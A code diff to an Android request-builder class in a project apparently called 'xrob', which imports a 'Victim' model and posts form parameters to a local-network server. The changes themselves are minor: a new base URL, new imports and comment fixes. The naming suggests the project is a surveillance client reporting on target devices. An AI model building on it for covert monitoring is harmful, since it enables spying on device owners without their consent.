@@ -4,6 +4,9 @@ import android.util.Log;
 
 import com.theah64.xrob.models.Victim;
 
+import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
+
 import okhttp3.FormBody;
 import okhttp3.Request;
 
@@ -13,7 +16,7 @@ import okhttp3.Request;
  */
 public class APIRequestBuilder {
 
-    private static final String BASE_URL = "http://192.168.43.234:8080/v1";
+    private static final String BASE_URL = "http://192.168.0.100:8080/v1";
     //private static final String BASE_URL = "http://xrob-theapache64.rhcloud.com/v1";
 
     private static final String X = APIRequestBuilder.class.getSimpleName();
@@ -45,18 +48,21 @@ public class APIRequestBuilder {
         logBuilder.append(String.format("%s='%s'\n", key, value));
     }
 
-    private APIRequestBuilder addParam(final boolean isAllowNull, final String key, final String value) {
+    private APIRequestBuilder addParam(final boolean isAllowNull, final String key, String value) {
+
 
         if (isAllowNull) {
             this.params.add(key, value);
             appendLog(key, value);
         } else {
-            //value must be not null.
+
+            //value must not be null.
             if (value != null) {
                 this.params.add(key, value);
                 appendLog(key, value);
             }
         }
+
 
         return this;
     }
